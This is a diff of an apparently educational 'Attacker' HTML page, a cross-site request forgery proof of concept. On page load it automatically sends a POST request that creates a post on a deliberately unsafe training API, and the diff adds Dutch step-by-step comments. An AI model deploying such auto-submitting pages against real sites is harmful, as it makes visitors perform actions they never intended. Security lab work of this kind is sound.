@@ -3,23 +3,35 @@
     <meta charset="UTF-8" />
     <title>Attacker - Post Create Post</title>
     <script>
+        // Basisconfiguratie voor deze proof-of-concept pagina.
         const website = "https://unsafe-api.ian-chains.be/";
 
+        /**
+         * Schrijft een statusbericht naar de pagina en kleurt het resultaat.
+         * Gebruikt rood voor errors en groen voor alle andere types.
+         */
         function set_status(message, type) {
+            // Stap 1: haal het status-element op.
             const el = document.getElementById('status');
             if (!el) {
                 return;
             }
 
+            // Stap 2: toon tekst en visuele feedback.
             el.textContent = message;
             el.style.color = type === 'error' ? '#b91c1c' : '#166534';
         }
 
+        /**
+         * Probeert automatisch een post te maken zodra de pagina laadt.
+         */
         async function create_post() {
+            // Stap 1: endpoint bepalen en gebruiker informeren.
             const url = website + "posts";
             set_status('Post aanmaken...', 'info');
 
             try {
+                // Stap 2: verstuur de POST-request met URL-encoded body.
                 const response = await fetch(url, {
                     method: "POST",
                     headers: { 'Content-Type': "application/x-www-form-urlencoded" },
@@ -30,6 +42,7 @@
                     })
                 });
 
+                // Stap 3: parse de response en behandel fouten.
                 const result = await response.json();
                 if (!response.ok) {
                     console.error('Status:', response.status, 'Error:', result);
@@ -37,15 +50,18 @@
                     return;
                 }
 
+                // Stap 4: succesfeedback tonen.
                 console.log('Post created successfully:', result);
                 set_status('Post succesvol aangemaakt.', 'success');
                 return;
             } catch (error) {
+                // Stap 5: netwerkfouten opvangen.
                 console.error(error);
                 set_status('Netwerkfout: ' + (error.message || String(error)), 'error');
             }
         }
 
+        // Start de actie automatisch bij paginalading.
         window.onload = () => {
             create_post();
         };
@@ -54,5 +70,5 @@
 <body>
 <h1 class="text-3xl font-bold mb-4">Post Create Post</h1>
 <p id="status">Wachten op laden...</p>
-<body>
+</body>
 </html>
